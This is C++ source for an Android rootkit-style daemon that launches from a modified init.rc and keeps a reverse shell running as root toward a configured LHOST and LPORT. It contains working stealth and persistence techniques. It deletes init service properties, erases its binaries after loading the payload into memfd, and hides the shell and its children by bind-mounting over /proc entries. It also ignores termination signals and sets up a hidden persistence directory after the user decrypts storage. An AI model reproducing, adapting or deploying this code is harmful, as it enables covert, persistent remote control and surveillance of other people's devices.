// Daemon to control execution of revshell
// Launched from init.rc in ramdisk

#include <sys/mount.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <dirent.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <stdio.h>
#include <android/log.h>

#include <utils.hpp>
#include <resetprop.hpp>


#ifdef MAGISK_DEBUG
#define LOG_TAG                     "revshell_exec"
#define ALOGD(...) __android_log_print(ANDROID_LOG_DEBUG,    LOG_TAG, __VA_ARGS__)
#else
#define ALOGD(...)
#endif

#define CHECK_FS_DECRYPTED_INTERVAL 5

#define ENCRYPTED_FS_CHECK_DIR      "/data/data"
#define ENCRYPTED_FS_CHECK_PROOF    "android"

#define TEMP_MNT_POINT              "/mnt/secure"
#define TEMP_DIR                    TEMP_MNT_POINT "/temp"
#define EMPTY_DIR                   TEMP_DIR "/.empty"

#define PERSIST_DIR                 "/data/adb/.fura"

#define DEV_PATH                    "/dev/sys_ctl"
#define DEV_REVSHELL                DEV_PATH "/revshell"
#define DEV_SEPOLICY                "/dev/.sp"

#define SBIN_REVSHELL               "/sbin/revshell"
#define SBIN_EXECUTOR               "/sbin/executor"

#define DEBUG_REVSHELL              "/debug_ramdisk/revshell"
#define DEBUG_EXECUTOR              "/debug_ramdisk/executor"
#define NEW_MAGISK_PATH             "/debug_ramdisk/magisk"

#define INITRC_SYSTEM               "/system/etc/init/hw/init.rc"
#define INIT_BIN_SYSTEM             "/system/bin/init"


bool check_fs_decrypted() {
    struct dirent *entry;
    DIR *dir = opendir(ENCRYPTED_FS_CHECK_DIR);
    if (dir == NULL) {
        return false;
    }
    while ((entry = readdir(dir)) != nullptr) {
        if (strstr(entry->d_name, ENCRYPTED_FS_CHECK_PROOF)) {
            closedir(dir);
            return true;
        }
    }
    closedir(dir);
    return false;
}

int hide_process(pid_t pid) {
    if (!pid) return -1;

    char buf[32];
    snprintf(buf, 31, "/proc/%d", pid);
    return mount(EMPTY_DIR, buf, nullptr, MS_BIND, nullptr);
}

int unhide_process(pid_t pid) {
    if (!pid) return -1;

    char buf[32];
    snprintf(buf, 31, "/proc/%d", pid);
    return umount(buf);
}

void block_signals() {
    signal(SIGINT, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGKILL, SIG_IGN);
}

int monitor_proc(pid_t ppid) {
    // Monitor all children of ppid and hide them
    std::string proc_dir = "/proc/";
    ALOGD("Starting revshell ...");

#ifdef HIDE_PROCESS_BIND
    hide_process(ppid);  // hide revshell
#endif

    while (true) {
        // Slight delay for not going crazy
        sleep(5);

        // TODO : is it OK to unhide for a brief moment?
        ALOGD("Checking PID");

#ifdef HIDE_PROCESS_BIND
        unhide_process(ppid);  // reveal for a brief moment
#endif

        // Check if revshell is alive
        char state;
        char statFilePath[32];
        FILE *statFile;

        snprintf(statFilePath, 31, "/proc/%d/stat", ppid);

        statFile = fopen(statFilePath, "re");
        if (statFile == NULL) {
            ALOGD("Revshell died! (no stat)");
            break;
        }

        fscanf(statFile, "%*d (%*[^)]) %c", &state);
        fclose(statFile);

        if (state == 'Z') {
            ALOGD("Revshell died! (state = Z)");
            break;
        }

#ifdef HIDE_PROCESS_BIND
        // hide it back if was revealed
        hide_process(ppid);

        // Open the /proc directory
        DIR* dir = opendir(proc_dir.c_str());
        if (!dir) break;

        // Iterate over the entries in the /proc directory
        // Find all children of revshell
        struct dirent* entry;
        while ((entry = readdir(dir)) != nullptr) {
            std::string entry_name = entry->d_name;
            int parent;

            // Check if the entry is a directory and represents a numeric PID
            if (entry->d_type == DT_DIR && std::all_of(entry_name.begin(), entry_name.end(), ::isdigit)) {
                snprintf(statFilePath, 31, "/proc/%s/stat", entry_name.c_str());

                statFile = fopen(statFilePath, "re");
                if (statFile == NULL)
                    continue;

                fscanf(statFile, "%*d (%*[^)]) %*c %d", &parent);
                fclose(statFile);

                if (parent == ppid) {
                    ALOGD("Hiding PID %s (child of %d)", entry_name.c_str(), parent);
                    hide_process(std::stoi(entry_name));
                }

            }
        }
        closedir(dir);
#endif
    }

    return -1;
}

int read_file(const char* filename, uint8_t** buf, size_t* filesize) {
    FILE* file = fopen(filename, "rb");
    if (!file) return -1;

    fseek(file, 0, SEEK_END);
    *filesize = ftell(file);
    fseek(file, 0, SEEK_SET);

    *buf = (uint8_t*) malloc(*filesize);
    if (!buf) { fclose(file); return -1; }

    fread(*buf, sizeof(uint8_t), *filesize, file);
    fclose(file);

    return 0;
}

std::string file_to_memfd(std::string filename) {
    // I know mixing c and c++ is bad :P
    uint8_t* buf;
    size_t size;

    if (read_file(filename.c_str(), &buf, &size) != 0) {
        ALOGD("ERROR: Could not read from %s", filename.c_str());
        return "";
    }

    int memfd = syscall(SYS_memfd_create, "anonymous", 0);
    if (memfd == -1) { free(buf); return ""; }

    write(memfd, buf, size);
    free(buf);

    lseek(memfd, 0, SEEK_SET);
    std::string memfd_path = "/proc/self/fd/" + std::to_string(memfd);
    ALOGD("memfd path: %s", memfd_path.c_str());

    return memfd_path;
}

int main(int argc, char** argv, char** envp) {
    /**
     * Hidden execution of payload
     *
     * Make some preparations and Execute payload
     *  1) hide props
     *  2) check & create dirs (persistence, temp)
     *  3) move revshell to RAM (memfd)
     *  4) cleanup dirs
     *  5) hide process using bind mounts (if defined)
     *  6) execute revshell from memfd
     */

    setuid(0);

    std::string revshell_path;
    int status;

    ALOGD("Executor is running");

    ALOGD("Blocking signals");
    block_signals();

    // Hide props
    if (argc >= 2) {
        ALOGD("Hiding init props");

        std::string svc_name = "init.svc." + std::string(argv[1]);
        delprop(svc_name.c_str());

        svc_name = "ro.boottime." + std::string(argv[1]);
        delprop(svc_name.c_str());

        svc_name = "init.svc_debug_pid." + std::string(argv[1]);
        delprop(svc_name.c_str());
    }

    // Unmount init.rc on android 11+ (if no magisk, i.e. revshell is not at debug_ramdisk)
    if (access(INITRC_SYSTEM, F_OK) == 0 && access(DEBUG_REVSHELL, F_OK) != 0) {
        ALOGD("Unmounting new init.rc");
        umount2(INITRC_SYSTEM, MNT_DETACH);
        umount2(INIT_BIN_SYSTEM, MNT_DETACH);
    }

    // Cleanup /sbin on rootfs
    if (access(SBIN_REVSHELL, F_OK) == 0) {
        mount(nullptr, "/sbin", nullptr, MS_REMOUNT, nullptr);

        revshell_path = file_to_memfd(SBIN_REVSHELL);
        remove(SBIN_REVSHELL);
        remove(SBIN_EXECUTOR);

        mount(nullptr, "/sbin", nullptr, MS_REMOUNT | MS_RDONLY, nullptr);
    }

    // Remove /dev/sys_ctl, /dev/.sp on SAR / 2SI
    else if (access(DEV_PATH, F_OK) == 0) {
        revshell_path = file_to_memfd(DEV_REVSHELL);
        umount2(DEV_PATH, MNT_DETACH);
        usleep(1000);
        rmdir(DEV_PATH);
        remove(DEV_SEPOLICY);
    }

    // Cleanup /debug_ramdisk (new magisk dir)
    else if (access(DEBUG_REVSHELL, F_OK) == 0) {
        revshell_path = file_to_memfd(DEBUG_REVSHELL);
        remove(DEBUG_REVSHELL);
        remove(DEBUG_EXECUTOR);
    }

    else {
        ALOGD("Error: revshell binary not found");
        return 1;
    }

    // Setup temp dir
    ALOGD("Setting up " TEMP_DIR);
    mkdir(TEMP_MNT_POINT, 0700);
    mkdir(TEMP_DIR, 0700);
    // If we are using our own context (not magisk), set temp dir context
    if (access(NEW_MAGISK_PATH, F_OK) != 0)
        system("chcon u:object_r:" SEPOL_PROC_DOMAIN ":s0 " TEMP_DIR);

#ifdef HIDE_PROCESS_BIND
    // fake proc dir (.empty)
    //     for some reason can't set permissions directly, chmod needed?
    mkdir(EMPTY_DIR, 0555);
    // fake selinux context and permissions
    system("chmod 555 " EMPTY_DIR);
    system("chcon u:r:kernel:s0 " EMPTY_DIR);
    int fd = open(EMPTY_DIR "/cmdline", O_WRONLY | O_CREAT, 0555);
    close(fd);
    mkdir(EMPTY_DIR "/fd", 0555);

    ALOGD("Hiding daemon process ...");
    hide_process(getpid());
    ALOGD("Process hidden");
#endif

#ifdef CREATE_PERSIST_DIR
    // await decryption by user
    ALOGD("Awaiting decryption ...");
    while (!check_fs_decrypted())
        sleep(CHECK_FS_DECRYPTED_INTERVAL);

    ALOGD("Decrypted. Setting persistence dir at " PERSIST_DIR);

    // just in case, give enough time for post-boot stuff ?
    sleep(5);

    // persistence dir     note: same thing, this time dir isn't created directly ??
    if (access(PERSIST_DIR, F_OK) != 0)
        mkdir(PERSIST_DIR, 0700);
    // practically useless since /data/adb/... is inaccessible without root anyway
    system("chcon u:object_r:" SEPOL_PROC_DOMAIN ":s0 " PERSIST_DIR);
#endif

    // my implementation of "service manager" (no logs, no traces)
    // now service is started as oneshot, which does not spam to dmesg
    while (true) {
        pid_t revshell = fork();
        if (revshell == -1) exit(EXIT_FAILURE);

        if (revshell == 0) {
            // Child (revshell)
            // TODO: Change this command line according to your payload if needed
#ifdef LPORT
            char *const rs_argv[] = {(char *const) revshell_path.c_str(), (char *const) "-p", (char *const) LPORT,
                                     (char *const) LHOST, nullptr};
#else
            char *const rs_argv[] = {(char *const) revshell_path.c_str(), (char *const) LHOST, nullptr};
#endif
            execve(revshell_path.c_str(), rs_argv, envp);

            ALOGD("ERROR: Could not exec revshell!");
            exit(1);
        } else {
            // Parent (executor)
            sleep(1);
            monitor_proc(revshell);
            waitpid(revshell, &status, 0);
            sleep(5);
        }
    }
}
